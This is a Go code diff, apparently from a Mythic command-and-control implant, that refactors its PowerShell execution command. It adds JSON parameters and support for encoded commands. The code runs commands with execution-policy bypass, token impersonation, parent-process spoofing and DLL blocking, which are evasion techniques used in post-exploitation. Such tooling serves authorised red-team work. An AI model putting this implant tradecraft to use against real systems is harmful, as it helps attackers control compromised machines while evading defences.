@@ -5,6 +5,7 @@ package commands
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"os/exec"
 	"strings"
@@ -26,6 +27,23 @@ func (c *PowershellCommand) Description() string {
 	return "Execute a PowerShell command or script"
 }
 
+// powershellParams represents structured parameters from Mythic
+type powershellParams struct {
+	Command string `json:"command"`
+	Encoded bool   `json:"encoded"`
+}
+
+// parsePowershellParams extracts command and encoded flag from task params.
+// Supports both JSON (structured params) and plain text (backward compat).
+func parsePowershellParams(params string) (string, bool) {
+	var p powershellParams
+	if err := json.Unmarshal([]byte(params), &p); err == nil && p.Command != "" {
+		return p.Command, p.Encoded
+	}
+	// Backward compat: entire params string is the command
+	return params, false
+}
+
 // Execute executes the powershell command
 func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
@@ -36,13 +54,24 @@ func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
+	command, encoded := parsePowershellParams(task.Params)
+	if command == "" {
+		return structs.CommandResult{
+			Output:    "Error: No command specified",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	opts := DefaultPSOptions()
+
 	// Check if impersonating — use CreateProcessWithTokenW path
 	tokenMutex.Lock()
 	token := gIdentityToken
 	tokenMutex.Unlock()
 
 	if token != 0 {
-		cmdLine := fmt.Sprintf(`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "%s"`, task.Params)
+		cmdLine := BuildPSCmdLine(command, opts, encoded)
 		output, err := runWithToken(token, cmdLine)
 		if err != nil {
 			outputStr := strings.TrimSpace(output)
@@ -74,7 +103,7 @@ func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
 	// Check for PPID spoofing or BlockDLLs — use extended attrs path
 	ppid := GetDefaultPPID()
 	if blockDLLsEnabled || ppid > 0 {
-		cmdLine := fmt.Sprintf(`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "%s"`, task.Params)
+		cmdLine := BuildPSCmdLine(command, opts, encoded)
 		output, err := runWithExtendedAttrs(cmdLine, ppid, blockDLLsEnabled)
 		if err != nil {
 			outputStr := strings.TrimSpace(output)
@@ -105,14 +134,14 @@ func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx,
-		"powershell.exe",
-		"-NoProfile",
-		"-NonInteractive",
-		"-ExecutionPolicy", "Bypass",
-		"-Command", task.Params,
-	)
+	var args []string
+	if encoded {
+		args = BuildPSArgsEncoded(command, opts)
+	} else {
+		args = BuildPSArgs(command, opts)
+	}
 
+	cmd := exec.CommandContext(ctx, "powershell.exe", args...)
 	output, err := cmd.CombinedOutput()
 
 	if err != nil {
